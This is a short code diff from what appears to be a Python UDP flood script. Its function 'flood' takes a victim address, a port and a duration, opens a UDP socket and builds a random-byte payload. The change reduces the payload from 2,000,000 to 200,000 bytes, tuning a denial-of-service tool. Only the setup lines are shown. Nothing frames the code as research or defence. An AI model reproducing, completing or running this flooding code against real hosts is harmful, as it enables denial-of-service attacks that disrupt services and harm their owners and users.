@@ -5,7 +5,7 @@ import random
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(2000000)
+    bytes = random._urandom(200000)
     timeout =  time.time() + duration
     sent = 0
 
